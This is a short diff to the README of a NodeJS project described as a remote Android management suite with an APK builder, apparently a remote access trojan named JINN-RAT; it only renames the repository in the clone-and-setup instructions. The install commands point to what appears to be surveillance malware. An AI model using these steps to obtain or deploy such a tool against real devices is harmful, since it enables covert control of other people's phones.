@@ -32,8 +32,8 @@ A cloud based remote android managment suite, powered by NodeJS
 - Built In APK Builder
 
 ```
-git clone https://github.com/alvinbaby/JINN-RAT
-cd JINN-RAT
+git clone https://github.com/alvinbaby/JINNRAT
+cd JINNRAT
 bash setup.sh
 ```
 ### Run
